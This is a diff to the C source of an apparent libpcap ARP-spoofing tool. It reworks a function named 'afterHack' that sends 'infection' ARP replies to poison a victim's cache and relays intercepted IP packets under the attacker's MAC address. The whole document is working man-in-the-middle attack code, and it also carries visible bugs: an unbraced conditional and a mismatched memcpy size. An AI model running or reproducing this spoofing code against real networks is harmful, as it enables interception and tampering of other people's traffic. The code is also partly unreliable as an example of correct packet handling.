@@ -158,43 +158,36 @@ void sendArpPacket(pcap_t * handle, uint8_t * src_mac, uint8_t * des_mac, uint8_
 }
 
 void afterHack(pcap_t * handle, uint8_t * atk_mac, uint8_t * trg_mac, uint8_t * sdr_mac, uint8_t * trg_ip, uint8_t * sdr_ip) {
-    int cnt = 0;
+    struct pcap_pkthdr * header;
+    const u_char * packet;
 
-    while (cnt < 100) {
-        struct pcap_pkthdr * header;
-        const u_char * packet;
+    int res = pcap_next_ex(handle, &header, &packet);
+    if (res <= 0) return;
 
-        int res = pcap_next_ex(handle, &header, &packet);
-        if (res == 0) continue;
-        if (res == -1 || res == -2) break;
+    struct ether_header * ether_pkt = (struct ether_header *)packet;
+    if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_ARP) { // send infection packet
+        struct arp_packet * arp_pkt = (struct arp_packet *)packet;
 
-        struct ether_header * ether_pkt = (struct ether_header *)packet;
-        if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_ARP) { // send infection packet
-            struct arp_packet * arp_pkt = (struct arp_packet *)packet;
-
-            if(cmpMacAddress(arp_pkt -> arp_hdr.arp_sha, sdr_mac) && cmpMacAddress(arp_pkt -> arp_hdr.arp_tha, trg_mac)) {
-                sendArpPacket(handle, atk_mac, sdr_mac, trg_ip, sdr_ip, 2);
-            }
-            cnt++;
+        if(cmpMacAddress(arp_pkt -> arp_hdr.arp_sha, sdr_mac) && cmpMacAddress(arp_pkt -> arp_hdr.arp_tha, trg_mac)) {
+            sendArpPacket(handle, atk_mac, sdr_mac, trg_ip, sdr_ip, 2);
         }
-        else if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_IP) { // send relay packet
-            struct ip_packet * ip_pkt = (struct ip_packet *)packet;
-            u_char * send_packet = (u_char *)malloc(header -> caplen);
+    }
+    else if(ntohs(ether_pkt -> ether_type) == ETHERTYPE_IP) { // send relay packet
+        struct ip_packet * ip_pkt = (struct ip_packet *)packet;
+        u_char * send_packet = (u_char *)malloc(header -> caplen);
 
-            if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sdr_mac) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, atk_mac))
-            memcpy(ip_pkt -> eth_hdr.ether_shost, atk_mac, ETHER_ADDR_LEN);
-            memcpy(send_packet, packet, header -> caplen);
-            memcpy(send_packet, ip_pkt, sizeof(struct arp_packet));
+        if(cmpMacAddress(ip_pkt -> eth_hdr.ether_shost, sdr_mac) && cmpMacAddress(ip_pkt -> eth_hdr.ether_dhost, atk_mac))
+        memcpy(ip_pkt -> eth_hdr.ether_shost, atk_mac, ETHER_ADDR_LEN);
+        memcpy(send_packet, packet, header -> caplen);
+        memcpy(send_packet, ip_pkt, sizeof(struct arp_packet));
 
-            printf("\n[+] Send Relay Packet!\n");
-            printMacAddress("  Old Src MAC", sdr_mac);
-            printMacAddress("  New Src MAC", atk_mac);
-            printMacAddress("  Dst MAC", trg_mac);
-            printIPAddress("  Target IP", (uint8_t *)&(ip_pkt -> ip_hdr.ip_dst));
-            pcap_sendpacket(handle, send_packet, header -> caplen);
+        printf("\n[+] Send Relay Packet!\n");
+        printMacAddress("  Old Src MAC", sdr_mac);
+        printMacAddress("  New Src MAC", atk_mac);
+        printMacAddress("  Dst MAC", trg_mac);
+        printIPAddress("  Target IP", (uint8_t *)&(ip_pkt -> ip_hdr.ip_dst));
+        pcap_sendpacket(handle, send_packet, header -> caplen);
 
-            free(send_packet);
-            cnt++;
-        }
+        free(send_packet);
     }
 }
